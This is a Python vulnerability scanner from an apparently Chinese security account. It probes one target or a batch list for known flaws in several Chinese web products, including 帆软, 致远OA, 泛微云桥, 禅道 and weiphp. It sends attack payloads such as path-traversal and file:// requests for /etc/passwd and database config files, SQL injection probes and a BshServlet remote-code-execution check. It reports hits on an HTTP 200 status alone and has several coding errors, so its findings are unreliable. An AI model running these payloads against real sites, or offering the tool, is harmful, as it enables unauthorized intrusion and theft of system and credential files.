import requests
import os
def zac():
    print("\033[31m----------------------------------")
    print("\033[31m ZAC漏洞扫描器")
    print("\033[31m公众号：ZAC安全\033[0m")
    print("\033[31m个人微信号: shenfenxinxichaxun99\033[0m")
    print("\033[31murl格式为 www.xxxxxxxx.xxxx\033[0m")
    print("\033[31m----------------------------------\033[0m")
def one():  #帆软v8.0扫描器
    try:url1 = url.replace("www.",'')
    except:
        pass
    try:
        url2 = "http://reports."+url1 + ":8080/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
        url3=requests.get(url2)
        if url3.status_code == 200:
            print('\033[34m可能存在帆软v8.0漏洞\033[0m')
        else:
            pass
    except:
        pass
def two(): #致远OA A6test.jsp sql注入漏洞
    url1 = "http://" + url +"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())"
    url2 = requests.get(url1)
    if url2.status_code==200:
        print("\033[34m可能存在致远OA A6test.jsp sql注入漏洞\033[0m")
    else:
        pass
def three(): #极致cms v1.71 v1.7 v1.67 sql注入漏洞
    url1="http://"+url+"mypay/alipay_return_pay?out_trade_no=1%27"
    try :url2=requests.get(url1)
    except BaseException:
        pass
    else:
        if url2.status_code==200:
            print("\033[34m可能存在极致Cms v1.71 v1.7 v1.67sql注入漏洞\033[0m")
        else:
            pass
def four():#锐捷云课堂主机 目录遍历漏洞
    url1="http://"+url+"/pool"
    url2=requests.get(url1)
    if url2.status_code==200:
        print("\033[34m可能存在锐捷云课堂主机目录遍历漏洞\033[0m")
    else:
        pass
def five():#weiphp任意文件读取漏洞
    url1="http://"+url+"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
    try:url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m可能存在weiphpv5.0任意文件读取漏洞\033[0m")
    else:
        pass
def six():#泛微云桥任意文件读取漏洞
    url1="http://"+url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    url1_1="http://"+url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    try: url2=requests.get(url1)

    except BaseException:
        print("无法获取响应码")
    try: url3 = requests.get(url1_1)
    except BaseException:
        print("无法获取响应码")

    if url2.status_code==200 or url3.status_code==200:
        print("\033[34m可能存在泛微云桥任意文件读取漏洞\033[0m")
    else:
        pass
def seven():#泛微云桥远程代码执行漏洞
    url1="http://"+url+"/weaver/bsh.servlet.BshServlet/"
    try: url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m可能存在泛微云桥远程代码执行漏洞\033[0m")
    else:
        pass
def eight():#流媒体管理服务器
    url1="http://"+url+"/config/user.xml"
    try:url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m可能存在流媒体管理服务器信息泄露\033[0m")
    else:
        pass
def nine():#禅道11.6任意文件读取
    url1="http://"+url+"/api-getModel-file-parseCSV-fileName=/etc/passwd"
    try:url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m可能存在禅道11.6任意文件读取\033[0m")
    else:
        pass
def ten():#BSPHP 未授权访问 信息泄露漏洞
    url1 = "http://" + url + "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘"
    try:
        url2 = requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code == 200:
        print("\033[34m可能存在BSPHP未授权访问\033[0m")
    else:
        pass
def eleven():#邮件归档系统eea信息泄露
    url1 = "http://" + url + "/authenticationserverservlet/"
    try:
        url2 = requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code == 200:
        print("\033[34m可能存在EEA信息泄露\033[0m")
    else:
        pass
def twelve():#蓝海卓越计费管理系统任意文件读取
    url1 = "http://" + url + "/download.php?file=../../../../../../../../etc/passwd"
    try:
        url2 = requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code == 200:
        print("\033[34m可能存在蓝海卓越计费管理系统任意文件读取\033[0m")
    else:
        pass

def main():
    one()
    two()
    three()
    four()
    five()
    six()
    seven()
    eight()
    nine()
    ten()
    eleven()
    twelve()
zac()
urlinput = input("单个扫描请按1，批量扫描请按2:")

if urlinput=="1":
    url = input("请输入你要扫描的网址")
    main()
    os.system("pause")
elif urlinput=="2":
    while 1:
        try:file = open(input("请输入您的批量扫描文件"))
        except BaseException:
            print("无法打开文件")
            break
        for line in file.readlines():
            url = line.strip('\n')
            print(url)
            main()
        os.system("pause")
        print(url)
        if not url:
            break
            file.close()




